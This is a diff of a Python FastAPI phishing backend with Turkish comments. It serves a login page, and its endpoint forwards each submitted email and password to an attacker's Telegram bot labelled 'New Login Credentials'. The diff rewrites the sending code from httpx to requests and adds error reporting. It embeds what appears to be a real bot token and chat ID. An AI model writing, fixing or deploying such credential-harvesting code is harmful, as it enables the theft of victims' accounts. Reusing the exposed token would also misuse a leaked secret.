@@ -1,14 +1,15 @@
 from fastapi import FastAPI, Request
 from fastapi.responses import HTMLResponse
-import httpx
+import requests  # httpx yerine requests kullan
 
 app = FastAPI()
 
-# Telegram bilgilerini buraya gir
-BOT_TOKEN = "8645926434:AAGMsVWcrZ-Str1WSwPae7QIgaS3diAkDQo"
-CHAT_ID = "8359722718"
+# --- BURAYA KENDİ BİLGİLERİNİ YAZ ---
+BOT_TOKEN = "8645926434:AAGMsVWcrZ-Str1WSwPae7QIgaS3diAkDQo"  # BotFather'dan aldığın token
+CHAT_ID = "8359722718"      # @userinfobot'tan aldığın sayı
+# --------------------------------------
 
-# HTML şablonu (direkt Python içinde)
+# HTML şablonu (AYNI, DEĞİŞMEDİ)
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -150,14 +151,21 @@ async def send_to_telegram(request: Request):
         
         message = f"🔐 Yeni Giriş Bilgileri:\n\n📧 E-posta: {email}\n🔑 Şifre: {password}"
         
-        async with httpx.AsyncClient() as client:
-            response = await client.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
-            )
-            if response.status_code == 200:
-                return {"success": True, "message": "Gönderildi"}
-            else:
-                return {"success": False, "message": "Telegram hatası"}
+        # Telegram'a gönder (requests kullanarak)
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        
+        response = requests.post(url, json=payload)
+        
+        if response.status_code == 200:
+            return {"success": True, "message": "Gönderildi"}
+        else:
+            # Hata detayını döndür
+            return {"success": False, "message": f"Telegram hatası: {response.text}"}
+            
     except Exception as e:
-        return {"success": False, "message": str(e)}
+        return {"success": False, "message": f"Sunucu hatası: {str(e)}"}
